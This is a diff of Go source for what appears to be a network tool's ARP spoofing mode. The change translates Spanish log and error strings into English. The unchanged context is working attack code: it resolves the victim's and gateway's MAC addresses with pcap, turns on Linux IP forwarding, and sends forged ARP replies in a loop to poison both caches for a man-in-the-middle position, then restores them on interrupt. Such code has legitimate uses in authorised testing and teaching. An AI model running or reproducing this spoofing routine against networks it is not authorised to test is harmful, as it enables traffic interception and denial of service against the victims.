@@ -23,12 +23,12 @@ import (
 // runSpoofMode ejecuta la lógica de suplantación ARP.
 func (r *Runner) runSpoofMode() error {
 	iface := r.scanConfig.Interface
-	log.Printf("Activando modo de suplantación ARP en la interfaz %s (%s)", iface.Name, iface.HardwareAddr)
+	log.Printf("Enabling ARP spoofing mode on interface %s (%s)", iface.Name, iface.HardwareAddr)
 
 	victimIP := net.ParseIP(r.cfg.SpoofTargetIP)
 	gatewayIP := net.ParseIP(r.cfg.GatewayIP)
 	if victimIP == nil || gatewayIP == nil {
-		return fmt.Errorf("IP de víctima o gateway inválida")
+		return fmt.Errorf("invalid victim or gateway IP")
 	}
 	victimIP = victimIP.To4()
 	gatewayIP = gatewayIP.To4()
@@ -37,33 +37,33 @@ func (r *Runner) runSpoofMode() error {
 	// Este diseño centraliza la gestión del recurso pcap, abordando la crítica principal.
 	handle, err := pcap.OpenLive(iface.Name, 128, true, pcap.BlockForever)
 	if err != nil {
-		return fmt.Errorf("no se pudo abrir el handle de pcap para suplantación: %w", err)
+		return fmt.Errorf("could not open pcap handle for spoofing: %w", err)
 	}
 	defer handle.Close()
 
-	log.Println("Obteniendo dirección MAC de la víctima...")
+	log.Println("Resolving victim MAC address...")
 	victimMAC, err := r.getMacForIPWithHandle(handle, victimIP)
 	if err != nil {
-		return fmt.Errorf("no se pudo obtener la MAC de la víctima (%s): %w", victimIP, err)
+		return fmt.Errorf("could not resolve victim MAC (%s): %w", victimIP, err)
 	}
-	log.Printf("-> MAC de la víctima (%s) obtenida: %s", victimIP, victimMAC)
+	log.Printf("-> Victim MAC (%s) resolved: %s", victimIP, victimMAC)
 
-	log.Println("Obteniendo dirección MAC del gateway...")
+	log.Println("Resolving gateway MAC address...")
 	gatewayMAC, err := r.getMacForIPWithHandle(handle, gatewayIP)
 	if err != nil {
-		return fmt.Errorf("no se pudo obtener la MAC del gateway (%s): %w", gatewayIP, err)
+		return fmt.Errorf("could not resolve gateway MAC (%s): %w", gatewayIP, err)
 	}
-	log.Printf("-> MAC del gateway (%s) obtenida: %s", gatewayIP, gatewayMAC)
+	log.Printf("-> Gateway MAC (%s) resolved: %s", gatewayIP, gatewayMAC)
 
 	// Limpiar el filtro BPF antes de empezar el envenenamiento para no filtrar nuestros propios paquetes.
 	if err := handle.SetBPFFilter(""); err != nil {
-		log.Printf("Advertencia: no se pudo limpiar el filtro BPF: %v", err)
+		log.Printf("Warning: could not clear BPF filter: %v", err)
 	}
 
 	if err := manageIPForwarding(true); err != nil {
-		log.Printf("ADVERTENCIA: No se pudo activar el reenvío de IP. El ataque puede causar una denegación de servicio. Error: %v", err)
+		log.Printf("WARNING: Could not enable IP forwarding. The attack may cause a denial of service. Error: %v", err)
 	} else {
-		log.Println("Reenvío de IP activado en el sistema.")
+		log.Println("IP forwarding enabled on the system.")
 	}
 
 	ctx, cancel := context.WithCancel(context.Background())
@@ -72,7 +72,7 @@ func (r *Runner) runSpoofMode() error {
 
 	go func() {
 		<-sigs
-		log.Println("\nSeñal de interrupción recibida. Limpiando y saliendo...")
+		log.Println("\nInterrupt signal received. Cleaning up and exiting...")
 		cancel()
 	}()
 
@@ -80,14 +80,14 @@ func (r *Runner) runSpoofMode() error {
 	ticker := time.NewTicker(r.cfg.SpoofInterval)
 	defer ticker.Stop()
 
-	log.Println("Iniciando bucle de envenenamiento ARP... Presiona Ctrl+C para detener.")
+	log.Println("Starting ARP poisoning loop... Press Ctrl+C to stop.")
 	for {
 		select {
 		case <-ticker.C:
 			sendArpReply(handle, iface.HardwareAddr, victimMAC, gatewayIP, victimIP)
 			sendArpReply(handle, iface.HardwareAddr, gatewayMAC, victimIP, gatewayIP)
 		case <-ctx.Done():
-			log.Println("Restaurando la caché ARP de la víctima y el gateway...")
+			log.Println("Restoring ARP cache for victim and gateway...")
 			// <<< USO DE VALORES CONFIGURABLES PARA RESTAURACIÓN >>>
 			restoreTicker := time.NewTicker(r.cfg.RestoreInterval)
 			defer restoreTicker.Stop()
@@ -105,12 +105,12 @@ func (r *Runner) runSpoofMode() error {
 				}
 			}
 
-			log.Println("Caché ARP restaurada.")
+			log.Println("ARP cache restored.")
 
 			if err := manageIPForwarding(false); err != nil {
-				log.Printf("ADVERTENCIA: No se pudo desactivar el reenvío de IP: %v", err)
+				log.Printf("WARNING: Could not disable IP forwarding: %v", err)
 			} else {
-				log.Println("Reenvío de IP desactivado.")
+				log.Println("IP forwarding disabled.")
 			}
 			return nil
 		}
@@ -123,12 +123,12 @@ func (r *Runner) getMacForIPWithHandle(handle *pcap.Handle, ip net.IP) (net.Hard
 
 	bpfFilter := fmt.Sprintf("arp and src host %s", ip.String())
 	if err := handle.SetBPFFilter(bpfFilter); err != nil {
-		return nil, fmt.Errorf("no se pudo establecer el filtro BPF para %s: %w", ip, err)
+		return nil, fmt.Errorf("could not set BPF filter for %s: %w", ip, err)
 	}
 
 	srcIP, err := scanner.GetSrcIPNet(iface)
 	if err != nil {
-		return nil, fmt.Errorf("no se pudo obtener la IP de origen de la interfaz: %w", err)
+		return nil, fmt.Errorf("could not get interface source IP: %w", err)
 	}
 
 	eth := layers.Ethernet{
@@ -185,7 +185,7 @@ func (r *Runner) getMacForIPWithHandle(handle *pcap.Handle, ip net.IP) (net.Hard
 
 	select {
 	case <-ctx.Done():
-		return nil, fmt.Errorf("timeout esperando la respuesta ARP de %s", ip)
+		return nil, fmt.Errorf("timeout waiting for ARP reply from %s", ip)
 	case mac := <-arpReplyChan:
 		return mac, nil
 	}
@@ -212,7 +212,7 @@ func sendArpReply(handle *pcap.Handle, srcMAC, dstMAC net.HardwareAddr, srcIP, d
 	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
 	gopacket.SerializeLayers(buf, opts, &eth, &arp)
 	if err := handle.WritePacketData(buf.Bytes()); err != nil {
-		log.Printf("Error enviando paquete de suplantación: %v", err)
+		log.Printf("Error sending spoofing packet: %v", err)
 	}
 }
 
@@ -224,14 +224,14 @@ func manageIPForwarding(enable bool) error {
 	// (como macOS con 'sysctl' o Windows con 'netsh'), se necesitaría una
 	// implementación por plataforma, idealmente detrás de una interfaz.
 	if runtime.GOOS != "linux" {
-		return errors.New("la gestión automática de IP forwarding solo está soportada en Linux")
+		return errors.New("automatic IP forwarding management is only supported on Linux")
 	}
 	const ipForwardPath = "/proc/sys/net/ipv4/ip_forward"
 
 	if enable {
 		val, err := os.ReadFile(ipForwardPath)
 		if err != nil {
-			return fmt.Errorf("no se pudo leer el estado actual de ip_forward: %w", err)
+			return fmt.Errorf("could not read current ip_forward state: %w", err)
 		}
 		originalIPForwardingValue = bytes.TrimSpace(val)
 		return os.WriteFile(ipForwardPath, []byte("1"), 0644)
